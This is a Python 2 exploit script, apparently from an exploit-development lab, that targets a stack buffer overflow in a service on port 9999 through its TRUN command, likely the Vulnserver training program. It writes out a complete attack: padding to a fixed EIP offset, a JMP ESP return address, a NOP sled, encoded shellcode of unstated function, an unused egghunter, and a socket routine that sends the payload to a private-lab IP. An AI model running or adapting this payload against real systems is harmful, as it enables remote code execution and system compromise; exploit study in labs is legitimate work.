#!/usr/bin/python
import sys
from subprocess import call
from struct import pack
import codecs
import socket
import os

host = "192.168.76.128"
port = 9999

def c(x):
  return pack('<L', x)

def pc(length):
    pattern = ''
    parts = ['A', 'a', '0']
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    return pattern

def junk(size):
	return "\x90"*size

shellcode = ("\xda\xc4\xbd\x7d\xac\xd8\xdb\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x31\x31\x68\x18\x03\x68\x18\x83\xc0\x79\x4e\x2d\x27\x69\x0c"
"\xce\xd8\x69\x71\x46\x3d\x58\xb1\x3c\x35\xca\x01\x36\x1b\xe6"
"\xea\x1a\x88\x7d\x9e\xb2\xbf\x36\x15\xe5\x8e\xc7\x06\xd5\x91"
"\x4b\x55\x0a\x72\x72\x96\x5f\x73\xb3\xcb\x92\x21\x6c\x87\x01"
"\xd6\x19\xdd\x99\x5d\x51\xf3\x99\x82\x21\xf2\x88\x14\x3a\xad"
"\x0a\x96\xef\xc5\x02\x80\xec\xe0\xdd\x3b\xc6\x9f\xdf\xed\x17"
"\x5f\x73\xd0\x98\x92\x8d\x14\x1e\x4d\xf8\x6c\x5d\xf0\xfb\xaa"
"\x1c\x2e\x89\x28\x86\xa5\x29\x95\x37\x69\xaf\x5e\x3b\xc6\xbb"
"\x39\x5f\xd9\x68\x32\x5b\x52\x8f\x95\xea\x20\xb4\x31\xb7\xf3"
"\xd5\x60\x1d\x55\xe9\x73\xfe\x0a\x4f\xff\x12\x5e\xe2\xa2\x78"
"\xa1\x70\xd9\xce\xa1\x8a\xe2\x7e\xca\xbb\x69\x11\x8d\x43\xb8"
"\x56\x71\xa6\x69\xa2\x1a\x7f\xf8\x0f\x47\x80\xd6\x53\x7e\x03"
"\xd3\x2b\x85\x1b\x96\x2e\xc1\x9b\x4a\x42\x5a\x4e\x6d\xf1\x5b"
"\x5b\x0e\x94\xcf\x07\xff\x33\x68\xad\xff")

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
egg = "w00tw00t"
exploit = ""
buffsize = 5000
EIP = 2003
ESP = 2007
EBP = 1999

# OFFSETS
# EIP 2003
# ESP 2007
# EBP 1999

exploit += junk(EIP)
exploit += c(0x625011af)
exploit += junk(20)
exploit += shellcode #ESP shellcode
exploit += junk(buffsize-len(exploit))

print len(exploit)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("TRUN /:./" + exploit)
s.close()
sys.exit()